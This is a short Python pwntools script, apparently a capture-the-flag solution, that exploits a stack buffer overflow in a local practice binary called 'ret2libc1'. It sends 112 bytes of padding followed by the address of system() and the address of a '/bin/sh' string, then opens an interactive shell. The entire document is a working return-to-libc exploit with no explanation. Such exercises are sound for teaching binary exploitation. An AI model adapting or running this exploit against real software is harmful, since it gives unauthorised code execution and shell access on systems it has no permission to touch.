#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1') 
binsh_addr = 0x08048720
system_addr = 0x8048460 
sh.sendline(b'A'*112+p32(system_addr)+b'a'*4+p32(binsh_addr))
sh.interactive()
